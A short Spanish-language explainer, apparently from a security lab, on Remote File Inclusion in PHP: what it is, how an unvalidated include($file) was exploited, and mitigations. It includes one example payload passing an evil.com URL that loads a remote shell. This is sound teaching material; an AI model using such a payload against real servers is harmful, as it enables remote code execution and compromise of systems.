# RFI

RFI (Remote File Inclusion, Inclusión Remota de Archivos) es una vulnerabilidad de seguridad que ocurre cuando una
aplicación web permite la inclusión de archivos desde una URL externa sin una validación adecuada. Esto puede permitir
la ejecución de código malicioso en el servidor objetivo, comprometiendo la seguridad del sistema.

## Cómo se ha explotado

El parámetro `file` se incluye directamente con `include($file)`. Un atacante puede pasar una URL remota como `?file=http://evil.com/shell.php` y forzar al servidor a cargar y ejecutar código malicioso desde un servidor externo.

## Mitigación

- No permitir la inclusión de URLs externas.
- Desactivar `allow_url_include` y `allow_url_fopen` en la configuración de PHP.
- Usar una lista blanca de archivos locales permitidos.
- Validar la ruta y asegurar que solo se pueda incluir contenido de directorios seguros.
